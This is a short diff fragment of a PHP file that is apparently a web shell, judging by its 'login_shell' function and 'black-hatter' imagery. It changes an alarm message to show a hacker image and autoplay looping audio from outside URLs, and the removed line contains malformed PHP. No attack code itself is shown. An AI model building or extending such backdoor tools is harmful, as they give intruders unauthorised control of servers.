@@ -48,7 +48,7 @@ function getar() {
 		</script>';
 }
 function alarm() {
-	die("<center><b><font color='#b0b000'>Alarm Aktif..! 🚨 "$warn"</font></b></center>");
+	die("<center><img src='https://3.bp.blogspot.com/-IpTodLWXERw/XK9YWZO_uvI/AAAAAAAAAvU/LGK0j91Ypl4f74ITUZr6yvushK3xcxM_wCLcBGAs/s1600/black-hatter%2B%25281%2529.jpg' height='1000px' width='667px'/></center><br> <audio autoplay loop > <source src=\"https://archive.org/download/RedAlert_201904/Red%20Alert.mp3\" type=\"audio/mpeg\"></audio>");
 }
 function login_shell() {
 ?>
